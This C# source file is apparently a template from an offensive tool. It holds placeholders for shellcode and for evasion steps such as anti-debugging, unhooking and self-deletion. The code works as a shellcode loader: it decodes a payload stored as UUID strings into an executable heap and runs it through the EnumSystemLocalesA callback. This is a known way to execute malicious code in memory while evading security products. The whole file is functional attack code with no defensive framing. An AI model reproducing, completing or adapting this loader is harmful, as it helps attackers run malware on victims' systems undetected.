using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Runtime;
using System.Threading;
//####USING#####

namespace USEConsole
{

    //####CODE####

    public static class Program
    {
        static void Main(string[] args)
        {
            //####DELAY####
            //####SELF_DELETE####
            //####UNHOOK####
            //####ANTIDEBUG####
            //####BYPASS####

            string[] uuids = ####SHELLCODE####;

            IntPtr hc = Win32.HeapCreate(0x00040000, UIntPtr.Zero, UIntPtr.Zero);
            if (hc == IntPtr.Zero)
            {
                Console.WriteLine("[-] HeapCreate Failed");
                return;
            }

            /* Actually causes an Access Violation or SEH Exception
            IntPtr ha = Win32.HeapAlloc(hc, 0, 0x100000);

            if (ha == IntPtr.Zero)
            {
                Console.WriteLine("[-] VirtualAlloc Failed");
                return;
            }
            */

            ulong result;
            IntPtr ha = hc;
            IntPtr hptr = ha;
            foreach (string uuid in uuids)
            {
                result = Win32.UuidFromStringA(uuid, hptr);
                if (result != 0)
                {
                    Console.WriteLine("[-] Something went terribly wrong");
                    Win32.CloseHandle(ha);
                    return;
                }
                hptr = IntPtr.Add(hptr, 16);
            }

            // Win32.EnumLocalesProcADelegate enumCallback = Marshal.GetDelegateForFunctionPointer<Win32.EnumLocalesProcADelegate>(ha);
            Win32.EnumSystemLocalesA(hc, LOCALETYPE.LOCALE_ALL);
            Win32.CloseHandle(hc);

        }

    }

    public static class Win32
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("Rpcrt4.dll", EntryPoint = "UuidFromStringA", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
        public static extern ulong UuidFromStringA(string StringUuid, IntPtr heapPointer);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern bool EnumSystemLocalesA(IntPtr pEnumProcA, LOCALETYPE dwFlags);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern void CloseHandle(IntPtr handle);

    }

    public enum LOCALETYPE : uint
    {
        LOCALE_ALL = 0x00000000, // enumerate all named based locales
        LOCALE_WINDOWS = 0x00000001, // shipped locales and/or replacements for them
        LOCALE_SUPPLEMENTAL = 0x00000002, // supplemental locales only
        LOCALE_ALTERNATE_SORTS = 0x00000004, // alternate sort locales
        LOCALE_NEUTRALDATA = 0x00000010, // Locales that are "neutral" (language only, region data is default)
        LOCALE_SPECIFICDATA = 0x00000020, // Locales that contain language and region data
    }

}